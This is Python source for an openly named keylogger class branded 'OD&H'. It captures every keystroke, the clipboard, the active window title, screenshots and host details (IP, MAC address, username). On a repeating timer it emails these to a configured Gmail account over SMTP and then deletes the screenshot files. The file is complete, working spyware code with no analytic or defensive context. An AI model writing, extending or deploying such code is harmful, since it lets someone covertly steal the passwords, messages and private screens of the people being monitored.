import os
import uuid
import json
import time
import socket
import shutil
import random
import string
import platform
import subprocess
import configparser
from datetime import datetime
from pynput import keyboard
from email import encoders
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
import smtplib
import pyscreenshot
import pyperclip
import pygetwindow as gw
import threading

class Keylogger:
    def __init__(self, config_file="config.ini"):
        self.config_file = config_file
        self.config = self._load_config()
        self.log = ""
        self.timer = None
        self.first_run = True
        self.shutdown_requested = False
        self.report_interval = self.config.getint("Settings", "report_interval", fallback=120)
        self.persistence = self.config.getboolean("Settings", "persistence", fallback=True)
        self.log_file = self.config.get("Settings", "log_file", fallback="odh_keylog.txt")
        self.system_info_file = self.config.get("Settings", "system_info_file", fallback="odh_system_info.json")
        self.screenshot_dir = self.config.get("Settings", "screenshot_dir", fallback="odh_screenshots")
        self.obfuscate = self.config.getboolean("Settings", "obfuscate", fallback=False)
        self.email_enabled = self.config.getboolean("Email", "enable_email_reporting", fallback=False)
        self.email = self.config.get("Email", "email", fallback="")
        self.password = self.config.get("Email", "password", fallback="")

        if self.email_enabled and (not self.email or not self.password):
            print("[!] OD&H - Email reporting misconfigured. Disabling.")
            self.email_enabled = False

        self._gather_system_info()

    def _load_config(self):
        config = configparser.ConfigParser()
        if os.path.exists(self.config_file):
            config.read(self.config_file)
        else:
            config['Settings'] = {
                'report_interval': '120',
                'persistence': 'True',
                'log_file': 'odh_keylog.txt',
                'system_info_file': 'odh_system_info.json',
                'screenshot_dir': 'odh_screenshots',
                'obfuscate': 'False'
            }
            config['Email'] = {
                'enable_email_reporting': 'False',
                'email': '',
                'password': ''
            }
            with open(self.config_file, 'w') as file:
                config.write(file)
        return config

    def _write_log(self, content):
        timestamp = datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
        line = f"{timestamp} {content}\n"
        self.log += line
        try:
            with open(self.log_file, "a") as f:
                f.write(line)
        except Exception as e:
            print(f"[ERROR] OD&H - Failed to write to log file '{self.log_file}': {e}")

    def _gather_system_info(self):
        try:
            info = {
                "Platform": platform.platform(),
                "OS": platform.system(),
                "Version": platform.version(),
                "Architecture": platform.machine(),
                "Hostname": socket.gethostname(),
                "IP Address": socket.gethostbyname(socket.gethostname()),
                "MAC Address": ':'.join(f'{(uuid.getnode() >> i) & 0xff:02x}' for i in range(40, -1, -8)),
                "Username": os.getlogin()
            }
            with open(self.system_info_file, "w") as f:
                json.dump(info, f, indent=4)
            self._write_log(f"OD&H - System information saved to '{self.system_info_file}'.")
        except Exception as e:
            self._write_log(f"OD&H - Error gathering system information: {e}")

    def _capture_screenshot(self):
        try:
            os.makedirs(self.screenshot_dir, exist_ok=True)
            filename = os.path.join(
                self.screenshot_dir,
                f"odh_screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
            )
            pyscreenshot.grab().save(filename)
            return filename
        except Exception as e:
            self._write_log(f"OD&H - Error capturing screenshot: {e}")
            return None

    def _get_clipboard(self):
        try:
            return pyperclip.paste()
        except Exception as e:
            return f"[OD&H Clipboard Error] {e}"

    def _get_active_window(self):
        try:
            window = gw.getActiveWindow()
            return window.title if window else "N/A"
        except Exception as e:
            return f"[OD&H - Window Error] {e}"

    def _send_email(self, subject, body, attachment=None):
        if not self.email_enabled:
            return

        msg = MIMEMultipart()
        msg["Subject"] = subject
        msg["From"] = self.email
        msg["To"] = self.email
        msg.attach(MIMEText(body, "plain"))

        if attachment:
            try:
                with open(attachment, "rb") as f:
                    part = MIMEBase("application", "octet-stream")
                    part.set_payload(f.read())
                    encoders.encode_base64(part)
                    part.add_header("Content-Disposition", f"attachment; filename={os.path.basename(attachment)}")
                    msg.attach(part)
            except Exception as e:
                self._write_log(f"OD&H - Attachment error: {e}")

        try:
            with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
                server.login(self.email, self.password)
                server.sendmail(self.email, self.email, msg.as_string())
            self._write_log("OD&H - Email sent successfully.")
        except Exception as e:
            self._write_log(f"OD&H - Email sending error: {e}")

    def _on_key_press(self, key):
        try:
            if hasattr(key, "char") and key.char:
                self._write_log(key.char)
            else:
                mapped = {
                    keyboard.Key.space: " ",
                    keyboard.Key.enter: " [ENTER] ",
                    keyboard.Key.backspace: " [BACKSPACE] ",
                    keyboard.Key.shift: " [SHIFT] ",
                    keyboard.Key.ctrl: " [CTRL] ",
                    keyboard.Key.alt: " [ALT] ",
                    keyboard.Key.tab: " [TAB] ",
                    keyboard.Key.esc: " [ESCAPE] ",
                    keyboard.Key.caps_lock: " [CAPSLOCK] "
                }.get(key, f" [{key}] ")
                self._write_log(mapped)
        except Exception as e:
            self._write_log(f"[Key Error] {e}")

    def _report(self):
        subject = "OD&H Keylogger Report"
        body = ""

        try:
            if os.path.exists(self.system_info_file):
                with open(self.system_info_file, "r") as f:
                    body += f"System Info:\n{f.read()}\n\n"
        except Exception as e:
            body += f"[Error reading system info] {e}\n\n"

        body += f"Active Window: {self._get_active_window()}\n"
        body += f"Clipboard: {self._get_clipboard()}\n\n"
        body += f"Logged Keys:\n{self.log}"

        screenshot = self._capture_screenshot()
        self._send_email(subject, body, screenshot)

        if screenshot and os.path.exists(screenshot):
            os.remove(screenshot)

        self.log = ""

        if not self.shutdown_requested:
            self.timer = threading.Timer(self.report_interval, self._report)
            self.timer.start()

    def start(self):
        try:
            self._report()

            with keyboard.Listener(on_press=self._on_key_press) as listener:
                listener.join()
        except Exception as e:
            self._write_log(f"OD&H - Keylogger failed to start: {e}")

    def shutdown(self):
        self.shutdown_requested = True
        if self.timer:
            self.timer.cancel()
